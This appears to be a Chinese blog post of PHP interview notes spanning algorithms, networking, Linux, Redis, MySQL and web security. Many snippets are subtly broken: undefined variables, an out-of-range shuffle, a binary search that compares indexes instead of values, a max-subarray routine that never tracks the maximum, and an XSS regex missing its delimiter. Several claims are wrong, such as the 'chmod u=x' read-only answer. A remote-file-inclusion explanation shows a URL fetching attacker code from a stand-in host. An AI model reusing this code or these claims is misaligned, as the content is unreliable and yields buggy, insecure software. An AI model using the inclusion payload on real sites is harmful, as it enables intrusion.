# 3年PHPer的面试总结 

11天前 ⋅ 6076 ⋅ 13 ⋅ 0 

### 算法

#### 1.反转函数的实现

```php
<?php
/**
 * 反转数组
 * @param  array $arr 
 * @return array
 */
function reverse($arr)
{
    $n = count($arr);

    $left = 0;
    $right = $n - 1;

    while ($left < $right) {
        $temp = $arr[$left];
        $arr[$left++] = $arr[$right];
        $arr[$right--] = $temp;
    }

    return $arr;
}
```

#### 2.两个有序int集合是否有相同元素的最优算法

```php
<?php
/**
 * 寻找两个数组里相同的元素
 * @param  array $arr1 
 * @param  array $arr2 
 * @return array      
 */
function find_common($arr1, $arr2)
{
    $common = array();
    $i = $j = 0;
    $count1 = count($arr1);
    $count2 = count($arr2);
    while ($i < $count1 && $j < $count2) {
        if ($arr1[$i] < $arr2[$j]) {
            $i++;
        } elseif ($arr1[$i] > $arr2[$j]) {
            $j++;
        } else {
            $common[] = $arr[$i];
            $i++;
            $j++;
        }
    }
    return array_unique($common);
}
```

#### 3.将一个数组中的元素随机（打乱）

```php
<?php
/**
 * 打乱数组
 * @param  array $arr 
 * @return array      
 */
function custom_shuffle($arr)
{
    $n = count($arr);
    for ($i = 0; $i < $n; $i++) {
        $rand_pos = mt_rand(0, $n);
        if ($rand_pos != $i) {
            $temp = $arr[$i];
            $arr[$i] = $arr[$rand_pos];
            $arr[$rand_pos] = $temp;
        }
    }
    return $arr;
}
```

#### 4.给一个有数字和字母的字符串，让连着的数字和字母对应

```php
<?php
function number_alphabet($str)
{
    $number = preg_split('/[a-z]+/', $str, -1, PREG_SPLIT_NO_EMPTY);
    $alphabet = preg_split('/\d+/', $str, -1, PREG_SPLIT_NO_EMPTY);
    $n = count($number);
    for ($i = 0; $i < $count; $i++) { 
        echo $number[$i] . ':' . $alphabet[$i] . '</br>';
    }
}
$str = '1a3bb44a2ac';
number_alphabet($str);//1:a 3:bb 44:a 2:ac
```

#### 5.求n以内的质数（质数的定义：在大于1的自然数中，除了1和它本身意外，无法被其他自然数整除的数）

思路： 1.（质数筛选定理）n不能够被不大于根号n的任何质数整除，则n是一个质数  
2.除了2的偶数都不是质数  
代码如下： 

```php
<?php
/**
 * 求n内的质数
 * @param int $n 
 * @return array
 */
function get_prime($n)
{
    $prime = array(2);//2为质数

    for ($i = 3; $i <= $n; $i += 2) {//偶数不是质数，步长可以加大 
        $sqrt = intval(sqrt($i));//求根号n

        for ($j = 3; $j <= $sqrt; $j += 2) {//i是奇数，当然不能被偶数整除，步长也可以加大。 
            if ($i % $j == 0) {
                break;
            }
        }

        if ($j > $sqrt) {
            array_push($prime, $i);
        }
    }

    return $prime;
}

print_r(getPrime(1000));
```

#### 6.约瑟夫环问题

相关题目：一群猴子排成一圈，按1,2,…,n依次编号。然后从第1只开始数，数到第m只,把它踢出圈，从它后面再开始数， 再数到第m只，在把它踢出去…，如此不停的进行下去， 直到最后只剩下一只猴子为止，那只猴子就叫做大王。要求编程模拟此过程，输入m、n, 输出最后那个大王的编号。

```php
<?php
/**
 * 获取大王
 * @param  int $n 
 * @param  int $m 
 * @return int  
 */
function get_king_mokey($n, $m) 
{
    $arr = range(1, $n);

    $i = 0;

    while (count($arr) > 1) {
        $i++;
        $survice = array_shift($arr);

        if ($i % $m != 0) {
            array_push($arr, $survice);
        }
    }

    return $arr[0];
}
```

#### 7.如何快速寻找一个数组里最小的1000个数

思路：假设最前面的1000个数为最小的，算出这1000个数中最大的数，然后和第1001个数比较，如果这最大的数比这第1001个数小的话跳过，如果要比这第1001个数大则将两个数交换位置，并算出新的1000个数里面的最大数，再和下一个数比较，以此类推。  
代码如下：

```php
<?php
//寻找最小的k个数
//题目描述
//输入n个整数，输出其中最小的k个。
/**
 * 获取最小的k个数
 * @param  array $arr 
 * @param  int $k   [description]
 * @return array
 */
function get_min_array($arr, $k)
{
    $n = count($arr);

    $min_array = array();

    for ($i = 0; $i < $n; $i++) {
        if ($i < $k) {
            $min_array[$i] = $arr[$i];
        } else {
            if ($i == $k) {
                $max_pos = get_max_pos($min_array);
                $max = $min_array[$max_pos];
            }

            if ($arr[$i] < $max) {
                $min_array[$max_pos] = $arr[$i];

                $max_pos = get_max_pos($min_array);
                $max = $min_array[$max_pos];
            }
        }
    }

    return $min_array;
}

/**
 * 获取最大的位置
 * @param  array $arr 
 * @return array
 */
function get_max_pos($arr)
{
    $pos = 0;
    for ($i = 1; $i < count($arr); $i++) { 
        if ($arr[$i] < $arr[$pos]) {
            $pos = $i;
        }
    }

    return $pos;
}

$array = [1, 100, 20, 22, 33, 44, 55, 66, 23, 79, 18, 20, 11, 9, 129, 399, 145, 2469, 58];

$min_array = get_min_array($array, 10);

print_r($min_array);
```

#### 8.如何在有序的数组中找到一个数的位置（二分查找）

代码如下：

```php
<?php
/**
 * 二分查找
 * @param  array $array 数组
 * @param  int $n 数组数量
 * @param  int $value 要寻找的值
 * @return int
 */
function binary_search($array, $n, $value)
{
    $left = 0;
    $right = $n - 1;

    while ($left <= $right) {
        $mid = intval(($left + $right) / 2);
        if ($value > $mid) {
            $right = $mid + 1;
        } elseif ($value < $mid) {
            $left = $mid - 1;
        } else {
            return $mid;
        }
    }

    return -1;
}
```

#### 9.给定一个有序整数序列，找出绝对值最小的元素

思路：二分查找

```php
<?php
/**
 * 获取绝对值最小的元素
 * @param  array $arr
 * @return int  
 */
function get_min_abs_value($arr)
{
    //如果符号相同，直接返回
    if (is_same_sign($arr[0], $arr[$n - 1])) {
        return $arr[0] >= 0 ? $arr[0] : $arr[$n - 1];
    }

    //二分查找
    $n = count($arr);
    $left = 0;
    $right = $n - 1;

    while ($left <= $right) {
        if ($left + 1 === $right) {
            return abs($arr[$left]) < abs($arr[$right]) ? $arr[$left] : $arr[$right];
        }

        $mid = intval(($left + $right) / 2);

        if ($arr[$mid] < 0) {
            $left = $mid + 1;
        } else {
            $right = $mid - 1;
        }
    }
}

/**
 * 判断符号是否相同
 * @param  int  $a 
 * @param  int  $b 
 * @return boolean  
 */
function is_same_sign($a, $b)
{
    if ($a * $b > 0) {
        return true;
    } else {
        return false;
    }
}
```

#### 10.找出有序数组中随机3个数和为0的所有情况

思路：动态规划

```php
<?php
function three_sum($arr)
{
    $n = count($arr);

    $return = array();

    for ($i=0; $i < $n; $i++) { 
        $left = $i + 1;
        $right = $n - 1;

        while ($left <= $right) {
            $sum = $arr[$i] + $arr[$left] + $arr[$right];

            if ($sum < 0) {
                $left++;
            } elseif ($sum > 0) {
                $right--;
            } else {
                $numbers = $arr[$i] . ',' . $arr[$left] . ',' . $arr[$right];
                if (!in_array($numbers, $return)) {
                    $return[] = $numbers;
                }

                $left++;
                $right--;
            }
        }
    }

    return $return;
}

$arr = [-10, -9, -8, -4, -2, 0, 1, 2, 3, 4, 5, 6, 9];
var_dump(three_sum($arr));
```

#### 11.编写一个PHP函数，求任意n个正负整数里面最大的连续和，要求算法时间复杂度尽可能低。

思路：动态规划

```php
<?php
/**
 * 获取最大的连续和
 * @param  array $arr 
 * @return int 
 */
function max_sum_array($arr)
{
    $currSum = 0;
    $maxSum = 0;//数组元素全为负的情况，返回最大数

    $n = count($arr);

    for ($i = 0; $i < $n; $i++) { 
        if ($currSum >= 0) {
            $currSum += $arr[$j];
        } else {
            $currSum = $arr[$j];
        }
    }

    if ($currSum > $maxSum) {
        $maxSum = $currSum;
    }

    return $maxSum;
}
```

### 计算机网络

#### 1.HTTP中GET与POST的区别，注意最后一条

1. GET在浏览器回退时是无害的，而POST会再次提交请求。
1. GET产生的URL地址可以被Bookmark，而POST不可以。
1. GET请求会被浏览器主动cache，而POST不会，除非手动设置。
1. GET请求只能进行url编码，而POST支持多种编码方式。
1. GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。
1. GET请求在URL中传送的参数是有长度限制的，而POST没有。
1. 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。
1. GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。
1. GET参数通过URL传递，POST放在Request body中。
1. **GET产生一个TCP数据包，POST产生两个TCP数据包。**

#### 2.为什么Tcp连接是三次，挥手是四次

在Tcp连接中，服务端的`SYN`和`ACK`向客户端发送是一次性发送的，而在断开连接的过程中，B端向A端发送的`ACK`和`FIN`是分`两次`发送的。因为在B端接收到A端的FIN后，B端可能还有数据要传输，所以先发送ACK，等B端处理完自己的事情后就可以发送FIN断开连接了。

#### 3.Cookie存在哪

1. 如果设置了过期时间，Cookie存在硬盘里
1. 没有设置过期时间，Cookie存在内存里

#### 4.COOKIE和SESSION的区别和关系

1. COOKIE保存在客户端，而SESSION则保存在服务器端
1. 从安全性来讲，SESSION的安全性更高
1. 从保存内容的类型的角度来讲，COOKIE只保存字符串（及能够自动转换成字符串）
1. 从保存内容的大小来看，COOKIE保存的内容是有限的，比较小，而SESSION基本上没有这个限制
1. 从性能的角度来讲，用SESSION的话，对服务器的压力会更大一些
1. SEEION依赖于COOKIE，但如果禁用COOKIE，也可以通过url传递

### Linux

#### 1.如何修改文件为当前用户只读

chmod u=x 文件名

#### 2.Linux进程属性

1. 进程：是用pid表示，它的数值是唯一的
1. 父进程：用ppid表示
1. 启动进程的用户：用UID表示
1. 启动进程的用户所属的组：用GID表示
1. 进程的状态：运行R，就绪W，休眠S，僵尸Z

#### 3.统计某一天网站的访问量

    awk '{print $1}' /var/log/access.log | sort | uniq | wc -l

推荐篇文章，讲awk实际使用的[shell在手分析服务器日志不愁][21]

### Nginx

#### 1.fastcgi通过端口监听和通过文件监听的区别

监听方式 | 形式 | nginx链接fastcgi方式 
-|-|-
端口监听 | fastcgi_pass 127.0.0.1:9000 | TCP链接 
文件监听 | fastcgi_pass /tmp/php_cgi.sock | Unix domain Socket 

#### 2.nginx的负载均衡实现方式

1. 轮询
1. 用户IP哈希
1. 指定权重
1. fair（第三方）
1. url_hash（第三方）

### Memcache/Redis

#### 1.Redis主从是怎样同步数据的？（即复制功能）

无论是初次连接还是重新连接，当建立一个从服务器时，从服务器都将从主服务器发送一个SYNC命令。接到SYNC命令的主服务器将开始执行BGSAVE，并在保存操作执行期间，将所有新执行的命令都保存到一个缓冲区里面，当BGSAVE执行完毕后，主服务器将执行保存操作所得到的.rdb文件发送给从服务器，从服务器接收这个.rdb文件，并将文件中的数据载入到内存中。之后主服务器会以Redis命令协议的格式，将写命令缓冲区中积累的所有内容都发送给从服务器。

#### 2.Memcache缓存命中率

缓存命中率 = get_hits/cmd_get * 100%

#### 3.Memcache集群实现

一致性Hash

#### 4.Memcache与Redis的区别

1. Memcache 
    * 该产品本身特别是数据在内存里边的存储，如果服务器突然断电，则全部数据就会丢失
    * 单个key（变量）存放的数据有1M的限制
    * 存储数据的类型都是String字符串类型
    * 本身没有持久化功能
    * 可以使用多核（多线程）

1. Redis 
    * 数据类型比较丰富:String、List、Set、Sortedset、Hash
    * 有持久化功能，可以把数据随时存储在磁盘上
    * 本身有一定的计算功能
    * 单个key（变量）存放的数据有1GB的限制

### MySQL

#### 1.执行SQL语句：select count(*) from articles 时，MyISAM和InnoDB哪个快

MyISAM快，因为MyISAM本身就记录了数量，而InnoDB要扫描数据

#### 3.隐式转换

* 当查询字段是INT类型，如果查询条件为CHAR，将查询条件转换为INT，如果是字符串前导都是数字将会进行截取，如果不是转换为0。
* 当查询字段是CHAR/VARCHAR类型，如果查询条件为INT，将查询字段为换为INT再进行比较，可能会造成全表扫描

#### 2.最左前缀原则

有一个复合索引：INDEX(`a`, `b`, `c`) 

使用方式 | 能否用上索引 
-|-
select * from users where a = 1 and b = 2 | 能用上a、b 
select * from users where b = 2 and a = 1 | 能用上a、b（有MySQL查询优化器） 
select * from users where a = 2 and c = 1 | 能用上a 
select * from users where b = 2 and c = 1 | 不能 

#### 3.聚簇索引和非聚簇索引的区别

聚簇索引的叶节点就是数据节点，而非聚簇索引的页节点仍然是索引检点，并保留一个链接指向对应数据块。

### PHP

#### 1.Session可不可以设置失效时间，比如30分钟过期

1. 设置seesion.cookie_lifetime有30分钟，并设置session.gc_maxlifetime为30分钟
1. 自己为每一个Session值增加timestamp
1. 每次访问之前, 判断时间戳

#### 2.PHP进程间通信的几种方式

* 消息队列
* 信号量+共享内存
* 信号
* 管道
* socket

#### 3.php类的静态调用和实例化调用各自的利弊

静态方法是类中的一个成员方法，属于整个类，即使不用创建任何对象也可以直接调用！静态方法效率上要比实例化高，静态方法的缺点是不自动销毁，而实例化的则可以做销毁。

#### 4.类的数组方式调用

ArrayAccess（数组式访问）接口

#### 5.用php写一个函数，获取一个文本文件最后n行内容，要求尽可能效率高，并可以跨平台使用。

```php
<?php
function tail($file, $num)
{  
    $fp = fopen($file,"r");  
    $pos = -2;
    $eof = "";  
    $head = false;   //当总行数小于Num时，判断是否到第一行了  
    $lines = array();  
    while ($num > 0) {  
        while($eof != PHP_EOL){  
            if (fseek($fp, $pos, SEEK_END) == 0) {    //fseek成功返回0，失败返回-1  
                $eof = fgetc($fp);
                $pos--;  
            } else {                            //当到达第一行，行首时，设置$pos失败  
                fseek($fp, 0, SEEK_SET);
                $head = true;                   //到达文件头部，开关打开  
                break;  
            }  
        }  
        array_unshift($lines, str_replace(PHP_EOL, '', fgets($fp)));   
        if ($head) {//这一句，只能放上一句后，因为到文件头后，把第一行读取出来再跳出整个循环  
            break; 
        }                 
        $eof = "";  
        $num--;  
    }  
    fclose($fp);  
    return $lines;  
}  
```

#### 6.`$SERVER['SERVER_NAME']`和`$SERVER['HTTP_HOST']`的区别

相同点： 当满足以下三个条件时，两者会输出相同信息。

1. 服务器为80端口
1. apache的conf中ServerName设置正确
1. HTTP/1.1协议规范

不同点：

1. 通常情况： `$_SERVER["HTTP_HOST"]` 在HTTP/1.1协议规范下，会根据客户端的HTTP请求输出信息。 `$_SERVER["SERVER_NAME"]` 默认情况下直接输出apache的配置文件httpd.conf中的ServerName值。
1. 当服务器为非80端口时： `$_SERVER["HTTP_HOST"]` 会输出端口号，例如：coffeephp.com:8080 `$_SERVER["SERVER_NAME"]` 会直接输出ServerName值 因此在这种情况下，可以理解为：`$_SERVER['HTTP_HOST']` = `$_SERVER['SERVER_NAME']` : `$_SERVER['SERVER_PORT']`
1. 当配置文件httpd.conf中的`ServerName`与HTTP/1.0请求的域名不一致时： httpd.conf配置如下： 

```apache
<virtualhost *>    
    ServerName jsyzchen.com    
    ServerAlias blog.jsyzchen.com    
</virtualhost>
```

客户端访问域名 blog.jsyzchen.com `$_SERVER["HTTP_HOST"]` 输出 blog.jsyzchen.com `$_SERVER["SERVER_NAME"]` 输出jsyzchen.com

#### 7.打开php.ini的safe_mode会影响哪些参数

当safe_mode=On时，会出现下面限制：

1. 所有输入输出函数（例如fopen()、file()和require()）的适用会受到限制，只能用于与调用这些函数的脚本有相同拥有者的文件。例如，假定启用了安全模式，如果Mary拥有的脚本调用fopen(),尝试打开由Jonhn拥有的一个文件，则将失败。但是，如果Mary不仅拥有调用 fopen()的脚本，还拥有fopen()所调用的文件，就会成功。
1. 如果试图通过函数popen()、system()或exec()等执行脚本，只有当脚本位于safe_mode_exec_dir配置指令指定的目录才可能。
1. HTTP验证得到进一步加强，因为验证脚本用于者的UID划入验证领域范围内。此外，当启用安全模式时，不会设置PHP_AUTH。
1. 如果适用MySQL数据库服务器，链接MySQL服务器所用的用户名必须与调用mysql_connect()的文件拥有者用户名相同。  
详细的解释可以查看官网：[http://www.php.net/manual/zh/ini.sect.safe-mode.php][43]**php safe_mode影响参数**

函数名 | 限制 
-|-
dbmopen() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
dbase_open() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
filepro() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
filepro_rowcount() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
filepro_retrieve() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
ifx_* sql_safe_mode | 限制, (!= safe mode) 
ingres_* sql_safe_mode | 限制, (!= safe mode) 
mysql_* sql_safe_mode | 限制, (!= safe mode) 
pg_loimport() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
posix_mkfifo() | 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。
putenv() | 遵循 ini 设置的 safe_mode_protected_env_vars 和 safe_mode_allowed_env_vars 选项。请参考 putenv() 函数的有关文档。
move_uploaded_file() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
chdir() | 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。
dl() | 本函数在安全模式下被禁用。
backtick operator | 本函数在安全模式下被禁用。
shell_exec() | （在功能上和 backticks 函数相同） 本函数在安全模式下被禁用。
exec() | 只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() 将被作用于此函数的参数上。
system() | 只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd()将被作用于此函数的参数上。
passthru() | 只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() | 将被作用于此函数的参数上。
popen() | 只能在 safe_mode_exec_dir 设置的目录下进行执行操作。基于某些原因，目前不能在可执行对象的路径中使用 ..。escapeshellcmd() | 将被作用于此函数的参数上。
fopen() | 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。
mkdir() | 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。
rmdir() | 检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。
rename() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。
unlink() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。
copy() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。(on source and target ) 
chgrp() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
chown() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。
chmod() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。另外，不能设置 SUID、SGID 和 sticky bits touch() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。
symlink() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。（注意：仅测试 target） 
link() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。（注意：仅测试 target） 
apache_request_headers() | 在安全模式下，以“authorization”（区分大小写）开头的标头将不会被返回。
header() | 在安全模式下，如果设置了 WWW-Authenticate，当前脚本的 uid 将被添加到该标头的 realm 部分。
PHP_AUTH 变量 | 在安全模式下，变量 PHP_AUTH_USER、PHP_AUTH_PW 和 PHP_AUTH_TYPE 在 `$_SERVER` 中不可用。但无论如何，您仍然可以使用 REMOTE_USER 来获取用户名称（USER）。（注意：仅 PHP 4.3.0 以后有效） 
highlight_file(), show_source() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。（注意，仅在 4.2.1 版本后有效） 
parse_ini_file() | 检查被操作的文件或目录是否与正在执行的脚本有相同的 UID（所有者）。检查被操作的目录是否与正在执行的脚本有相同的 UID（所有者）。（注意，仅在 4.2.1 版本后有效） 
set_time_limit() | 在安全模式下不起作用。
max_execution_time | 在安全模式下不起作用。
mail() | 在安全模式下，第五个参数被屏蔽。

#### 8.PHP解决多进程同时写一个文件的问题

```php 
<?php
function write($str)
{
    $fp = fopen($file, 'a');
    do {
        usleep(100);
    } while (!flock($fp, LOCK_EX));
    fwrite($fp, $str . PHP_EOL);
    flock($fp, LOCK_UN);
    fclose($fp);
}
```

#### 9.PHP里的超全局变量

* `$GLOBALS`
* `$_SERVER`
* `$_GET`
* `$_POST`
* `$_FILES`
* `$_COOKIE`
* `$_SESSION`
* `$_REQUEST`
* `$_ENV`

#### 10.php7新特性

* ?? 运算符（NULL 合并运算符）
* 函数返回值类型声明
* 标量类型声明
* use 批量声明
* define 可以定义常量数组
* 闭包（ Closure）增加了一个 call 方法 详细的可以见官网：[php7-new-features][47]

#### 11.php7卓越性能背后的优化

* 减少内存分配次数
* 多使用栈内存
* 缓存数组的hash值
* 字符串解析成桉树改为宏展开
* 使用大块连续内存代替小块破碎内存 详细的可以参考鸟哥的PPT：[PHP7性能之源][49]

#### 12.`include($_GET['p'])`的安全隐患

现在任一个黑客现在都可以用:http://www.yourdomain.com/index.php?p=anyfile.txt 来获取你的机密信息，或执行一个PHP脚本。 如果allow_url_fopen=On，你更是死定了： 试试这个输入：http://www.yourdomain.com/index.php?p=http://youaredoomed.com/phphack.php 现在你的网页中包含了http://www.youaredoomed.com/phphack.php的输出. 黑客可以发送垃圾邮件，改变密码，删除文件等等。只要你能想得到。

#### 13.列出一些防范SQL注入、XSS攻击、CSRF攻击的方法

SQL注入：

* `addslashes`函数
* `mysql_real_escape_string`/`mysqli_real_escape_string`/`PDO::quote()`
* **PDO预处理 XSS**：htmlspecial函数 CSRF：
* 验证HTTP REFER
* 使用token进行验证

#### 14.接口如何安全访问

jwt或验证签名

#### 15.PHP里有哪些设计模式

* 单例模式
* 工厂模式
* 脸面模式（facade）
* 注册器模式
* 策略模式
* 原型模式
* 装饰器模式 更多的可以看[PHP设计模式简介][54]这篇文章

#### 16.验证ip是否正确

```php
<?php
function check_ip($ip)
{
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
    return false;
    } else {
        return true;
    }
}
```

#### 17.验证日期是否合理

```php
<?php
function check_datetime($datetime)
{
    if (date('Y-m-d H:i:s', strtotime($datetime)) === $datetime) {
        return true;
    } else {
        return false;
    }
}
```

#### 18.写一个正则表达式，过滤JS脚本（及把script标记及其内容都去掉）


```php
<?php
$text = '<script>alert('XSS')</script>';
$pattern = '<script.*>.*<\/script>/i';
$text = preg_replace($pattern, '', $text);
```


#### 19.下单后30分钟未支付取消订单

第一种方案：被动过期+cron，就是用户查看的时候去数据库查有没有支付+定时清理。 第二种方案：延迟性任务，到时间检查订单是否支付成功，如果没有支付则取消订单

#### 20.设计一个秒杀系统

思路：用redis的队列

```php
<?php
$redis_key = 'seckill';//记录中奖记录
$uid = $GET['uid'];
$count = 10;//奖品的数量
if ($redis->lLen($redis_key) < 10) {
    $redis->rPush($redis_key, $uid . '_' . microtime());
    echo "秒杀成功";
} else {
    echo "秒杀已结束";
}
```

#### 21.请设计一个实现方式，可以给某个ip找到对应的省和市，要求效率竟可能的高

```php
<?php
//ip2long，把所有城市的最小和最大Ip录进去
$redis_key = 'ip';
$redis->zAdd($redis_key, 20, '#bj');//北京的最小IP加#
$resid->zAdd($redis_key, 30, 'bj');//最大IP

function get_ip_city($ip_address)
{
    $ip = ip2long($ip_address);

    $redis_key = 'ip';
    $city = zRangeByScore($redis_key, $ip, '+inf', array('limit' => array(0, 1)));
    if ($city) {
        if (strpos($city[0], "#") === 0) {
            echo '城市不存在!';
        } else {
            echo '城市是' . $city[0];
        }
    } else {
        echo '城市不存在!';
    }
}
```

### 其他

#### 1.网页/应用访问慢突然变慢，如何定位问题

1. top、iostat查看cpu、内存及io占用情况
1. 内核、程序参数设置不合理 查看有没有报内核错误，连接数用户打开文件数这些有没有达到上限等等
1. 链路本身慢 是否跨运营商、用户上下行带宽不够、dns解析慢、服务器内网广播风暴什么的
1. 程序设计不合理 是否程序本身算法设计太差，数据库语句太过复杂或者刚上线了什么功能引起的
1. 其它关联的程序引起的 如果要访问数据库，检查一下是否数据库访问慢
1. 是否被攻击了 查看服务器是否被DDos了等等
1. 硬件故障 这个一般直接服务器就挂了，而不是访问慢

#### 2.如何设计/优化一个访问量比较大的博客/论坛

* 减少http请求（比如使用雪碧图）
* 优化数据库（范式、SQL语句、索引、配置、读写分离）
* 缓存使用（Memcache、Redis）
* 负载均衡
* 动态内容静态化+CDN
* 禁止外部盗链（refer、图片添加水印）
* 控制大文件下载
* 使用集群

#### 3.如何搭建Composer私有库

使用[satis][65]搭建  
相关文章介绍：[使用satis搭建Composer私有库][66]

[21]: https://segmentfault.com/a/1190000009745139
[43]: http://www.php.net/manual/zh/ini.sect.safe-mode.php
[47]: https://secure.php.net/manual/en/migration70.new-features.php
[49]: https://github.com/devlinkcn/ppts_for_php2016/blob/master/%EF%BC%88%E6%83%A0%E6%96%B0%E5%AE%B8%EF%BC%89PHP7%E6%80%A7%E8%83%BD%E4%B9%8B%E6%BA%90.pdf
[54]: http://larabase.com/collection/5/post/143
[65]: https://github.com/composer/satis
[66]: https://joelhy.github.io/2016/08/10/composer-private-packages-with-satis/